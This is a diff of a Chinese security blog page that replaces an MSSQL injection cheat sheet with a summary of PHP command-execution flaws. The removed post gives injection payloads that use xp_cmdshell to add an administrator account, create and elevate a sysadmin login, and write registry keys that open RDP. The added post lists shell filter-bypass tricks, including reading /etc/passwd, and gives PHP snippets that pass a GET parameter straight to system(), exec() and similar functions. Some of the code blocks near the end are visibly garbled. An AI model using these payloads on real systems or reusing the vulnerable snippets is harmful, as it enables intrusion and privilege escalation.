@@ -6,17 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yd0ng.github.io">
-  <title>深入学习MSSQL注入方式 | 不知名网络安全选手的博客</title>
+  <title>命令执行漏洞 | 不知名网络安全选手的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="记录一下MSSQL注入的学习过程~">
+  <meta name="description" content="命令执行漏洞总结，主要讲述PHP相关的RCE，其他的后续慢慢补充~">
 <meta property="og:type" content="article">
-<meta property="og:title" content="深入学习MSSQL注入方式">
-<meta property="og:url" content="https://yd0ng.github.io/2020/09/14/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0MSSQL%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:title" content="命令执行漏洞">
+<meta property="og:url" content="https://yd0ng.github.io/2020/09/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="不知名网络安全选手的博客">
-<meta property="og:description" content="记录一下MSSQL注入的学习过程~">
+<meta property="og:description" content="命令执行漏洞总结，主要讲述PHP相关的RCE，其他的后续慢慢补充~">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-09-14T05:54:48.000Z">
-<meta property="article:modified_time" content="2020-09-14T13:17:58.340Z">
+<meta property="article:published_time" content="2020-09-15T02:37:50.000Z">
+<meta property="article:modified_time" content="2020-09-15T08:11:00.321Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
@@ -135,56 +135,83 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-深入学习MSSQL注入方式" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-命令执行漏洞" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      深入学习MSSQL注入方式
+      命令执行漏洞
     </h1>
   
 
         
-        <a href="/2020/09/14/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0MSSQL%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/" class="archive-article-date">
-  	<time datetime="2020-09-14T05:54:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-14</time>
+        <a href="/2020/09/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
+  	<time datetime="2020-09-15T02:37:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>记录一下MSSQL注入的学习过程~</p>
+        <p>命令执行漏洞总结，主要讲述PHP相关的RCE，其他的后续慢慢补充~</p>
 <a id="more"></a>
 
-<h1 id="常用查询"><a href="#常用查询" class="headerlink" title="常用查询"></a>常用查询</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select is_srvrolemember(&#39;sysadmin&#39;);  判断当前是否为sa</span><br><span class="line">select is_srvrolemember(&#39;db_owner&#39;);  判断当前用户写文件、读文件的权限（db_owner）</span><br><span class="line">select is_srvrolemember(&#39;public&#39;);  判断是否有public权限，可以爆破表</span><br></pre></td></tr></table></figure>
-<h2 id="判断SQL类型"><a href="#判断SQL类型" class="headerlink" title="判断SQL类型"></a>判断SQL类型</h2><p>MSSQL用以下语句判断</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and exists(select * from sysobjects)</span><br><span class="line">and exists(select is_srvrolemember(&#39;sysadmin&#39;))</span><br><span class="line">and (select is_srvrolemember(&#39;sysadmin&#39;))&gt;0</span><br></pre></td></tr></table></figure>
-<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><h2 id="判断注入是否存在"><a href="#判断注入是否存在" class="headerlink" title="判断注入是否存在"></a>判断注入是否存在</h2><p>同MySQL与Oracle注入类似,加单双引号观察其是否报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1</span><br><span class="line">?id&#x3D;1&#39;</span><br><span class="line">?id&#x3D;1&quot;</span><br><span class="line">?id&#x3D;1)</span><br></pre></td></tr></table></figure>
-<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p>构造语句为True或者False，并观察内容来判断</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">&#39; and &#39;1&#39;&#x3D;&#39;2</span><br><span class="line">and 1&#x3D;1</span><br><span class="line">and 1&#x3D;2</span><br></pre></td></tr></table></figure>
-<h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p>通过二分法和order by来快速确定列数，有时候要稍大范围确定一下，容易误判</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br></pre></td></tr></table></figure>
-<h2 id="判断字段类型"><a href="#判断字段类型" class="headerlink" title="判断字段类型"></a>判断字段类型</h2><p>MSSQL与Oracle数据类型比较严格，要测试出每个字段是字符型还是整型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select null,null</span><br><span class="line">union select &#39;null&#39;,null</span><br><span class="line">union select null,&#39;null&#39;</span><br><span class="line">union select &#39;null&#39;,&#39;null&#39;</span><br></pre></td></tr></table></figure>
-<h2 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select db_name()</span><br></pre></td></tr></table></figure>
-<h2 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select top 1 name from mozhe_db_v2..sysobjects where xtype&#x3D;&#39;u&#39;</span><br><span class="line">select top 1 table_name from information_schema.tables</span><br></pre></td></tr></table></figure>
-<h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from tables</span><br></pre></td></tr></table></figure>
-
-<h1 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h1><p>查看是否存在xp_cmdshell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(select count(*) from master.dbo.sysobjects where xtype &#x3D; &#39;x&#39; and name &#x3D; &#39;xp_cmdshell&#39;)</span><br></pre></td></tr></table></figure>
-<p>用xp_cmdshell执行命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &quot;net user name password &#x2F;add&quot;--</span><br><span class="line">;exec master..xp_cmdshell &quot;net localgroup name administrators &#x2F;add&quot;--</span><br></pre></td></tr></table></figure>
-<p>查看权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and (select IS_SRVROLEMEMBER(&#39;sysadmin&#39;))&#x3D;1--  &#x2F;&#x2F;sa</span><br><span class="line">and (select IS_MEMBER(&#39;db_owner&#39;))&#x3D;1--   &#x2F;&#x2F;  dbo</span><br><span class="line">and (select IS_MEMBER(&#39;public&#39;))&#x3D;1--  &#x2F;&#x2F;public</span><br></pre></td></tr></table></figure>
-<p>创建个登录mssql的账号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master.dbo.sp_addlogin name,pass;--</span><br></pre></td></tr></table></figure>
-<p>把创建的mssql登陆帐号提升到sysadmin</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master.dbo.sp_addsrvrolemember name,sysadmin;--</span><br></pre></td></tr></table></figure>
-<p>开3389</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#39;exec master..xp_regwrite @r,&#39;software\microsoft\windows\currentversion\netcache&#39;,&#39;enable&#39;,&#39;reg_sz&#39;,&#39;0&#39;;----</span><br><span class="line">;declare @r varchar(255) set @r&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;exec master..xp_regwrite @r,&#39;software\microsoft\windows nt\currentversion\winlogon&#39;,&#39;shutdownwithoutlogon&#39;,&#39;reg_sz&#39;,&#39;0&#39;;----</span><br><span class="line">;declare @r varchar(255) set @r&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;exec master..xp_regwrite @r,&#39;software\policies\microsoft\windows\installer&#39;,&#39;enableadmintsremote&#39;,&#39;reg_dword&#39;,1;----</span><br><span class="line">;declare @r varchar(255) set @r&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;exec master..xp_regwrite @r,&#39;system\currentcontrolset\control\terminal server&#39;,&#39;Tsenabled&#39;,&#39;reg_dword&#39;,1;----</span><br><span class="line">;declare @r varchar(255) set @r&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;exec master..xp_regwrite @r,&#39;system\currentcontrolset\services\termdd&#39;,&#39;start&#39;,&#39;reg_dword&#39;,2;----</span><br><span class="line">;declare @r varchar(255) set @r&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;exec master..xp_regwrite @r,&#39;system\currentcontrolset\services\termservice&#39;,&#39;start&#39;,&#39;reg_dword&#39;,2;----</span><br><span class="line">;declare @r varchar(255) set @r&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;exec master..xp_regwrite &#39;hkey_users&#39;,&#39;.default\keyboard layout\toggle&#39;,&#39;hotkey&#39;,&#39;reg_sz&#39;,&#39;1&#39;;----</span><br><span class="line">;declare @r varchar(255) set @r&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;exec master..xp_cmdshell &#39;iisreset &#x2F;reboot&#39;;----</span><br></pre></td></tr></table></figure>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>命令执行漏洞，即因为过滤不严等原因，导致函数或者参数可控，从而导致可以执行系统命令等，即我们通常所说的RCE。</p>
+<h2 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h2><p>命令执行漏洞严格来说分为两种</p>
+<ul>
+<li>一种是相应的语言函数导致的代码执行，比如eval()这种，我们称之为代码执行；</li>
+<li>一种是执行系统函数导致的代码执行，比如我们的system()函数等，我们成为系统命令执行；</li>
+</ul>
+<h1 id="bypass-Tricks"><a href="#bypass-Tricks" class="headerlink" title="bypass-Tricks"></a>bypass-Tricks</h1><ul>
+<li>&amp;、&amp;&amp;</li>
+<li>|、||</li>
+<li>;</li>
+<li>%0a、%0d、%09</li>
+<li>‘’、””</li>
+<li>``和$()</li>
+<li>()和{}</li>
+<li>正则或通配符bypass</li>
+<li>[]和{} bypass</li>
+<li>base64或进制 bypass</li>
+<li>${IFS}、&lt;&gt;、$IFS</li>
+<li>变量bypass，如a=l;b=s;$a$b</li>
+<li>反斜杠bypass</li>
+<li>$*、$@、$x(1&lt;x&lt;9)、${x}(x&gt;=10)</li>
+<li>{cat,/etc/passwd}</li>
+<li>重定向&lt;&gt; bypass</li>
+</ul>
+<h1 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h1><h2 id="php相关RCE"><a href="#php相关RCE" class="headerlink" title="php相关RCE"></a>php相关RCE</h2><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><ul>
+<li>eval()</li>
+<li>assert()</li>
+<li>preg_replace(‘’)</li>
+<li>create_function()</li>
+<li>array_map()</li>
+<li>call_user_func()</li>
+<li>call_user_func_array()</li>
+<li>array_filter()</li>
+<li>uasort()</li>
+</ul>
+<h3 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h3><p>system()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$cmd&#x3D;$_GET[&#39;cmd&#39;];</span><br><span class="line">system($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>passthru()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$cmd&#x3D;$_GET[&#39;cmd&#39;];</span><br><span class="line">passthru($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>exec()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$cmd&#x3D;$_GET[&#39;cmd&#39;];</span><br><span class="line">echo exec($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>pcntl_exec()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php pcntl_exec(“&#x2F;bin&#x2F;bash”, array(“run.sh”));?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>shell_exec()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$cmd&#x3D;$_GET[&#39;cmd&#39;];</span><br><span class="line">echo shell_exec($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
+<li>popen()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">* proc_open()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* ob_start()</span><br><span class="line"></span><br><span class="line">## Java相关命令执行函数</span><br></pre></td></tr></table></figure>
+```<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1></li>
+<li><a href="https://xz.aliyun.com/t/3918" target="_blank" rel="noopener">https://xz.aliyun.com/t/3918</a></li>
+<li><a href="http://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">http://www.ghtwf01.cn/index.php/archives/273/</a></li>
+<li><a href="https://www.freebuf.com/company-information/228881.html" target="_blank" rel="noopener">https://www.freebuf.com/company-information/228881.html</a></li>
+<li><a href="https://blog.csdn.net/qq_37133717/article/details/95231291" target="_blank" rel="noopener">https://blog.csdn.net/qq_37133717/article/details/95231291</a></li>
+<li><a href="https://bbs.ichunqiu.com/thread-41471-1-1.html?from=beef" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-41471-1-1.html?from=beef</a></li>
+</ul>
 
       
       
@@ -288,7 +315,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/09/14/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0MSSQL%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/09/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -302,18 +329,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/09/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          命令执行漏洞
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/09/12/2021%E7%A7%8B%E6%8B%9B%E7%AC%94%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">2021秋招笔试面试记录</div>
+    <a href="/2020/09/14/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0MSSQL%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">深入学习MSSQL注入方式</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -340,7 +358,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#常用查询"><span class="toc-number">1.</span> <span class="toc-text">常用查询</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#判断SQL类型"><span class="toc-number">1.1.</span> <span class="toc-text">判断SQL类型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#联合注入"><span class="toc-number">2.</span> <span class="toc-text">联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#判断注入是否存在"><span class="toc-number">2.1.</span> <span class="toc-text">判断注入是否存在</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断注入类型"><span class="toc-number">2.2.</span> <span class="toc-text">判断注入类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断列数"><span class="toc-number">2.3.</span> <span class="toc-text">判断列数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断字段类型"><span class="toc-number">2.4.</span> <span class="toc-text">判断字段类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查询数据库名"><span class="toc-number">2.5.</span> <span class="toc-text">查询数据库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查询列名"><span class="toc-number">2.6.</span> <span class="toc-text">查询列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查询数据"><span class="toc-number">2.7.</span> <span class="toc-text">查询数据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#执行系统命令"><span class="toc-number">3.</span> <span class="toc-text">执行系统命令</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#类别"><span class="toc-number">1.1.</span> <span class="toc-text">类别</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bypass-Tricks"><span class="toc-number">2.</span> <span class="toc-text">bypass-Tricks</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞函数"><span class="toc-number">3.</span> <span class="toc-text">漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php相关RCE"><span class="toc-number">3.1.</span> <span class="toc-text">php相关RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码执行"><span class="toc-number">3.1.1.</span> <span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#系统命令执行"><span class="toc-number">3.1.2.</span> <span class="toc-text">系统命令执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol>
                     </div>
                 </span>
             </div>
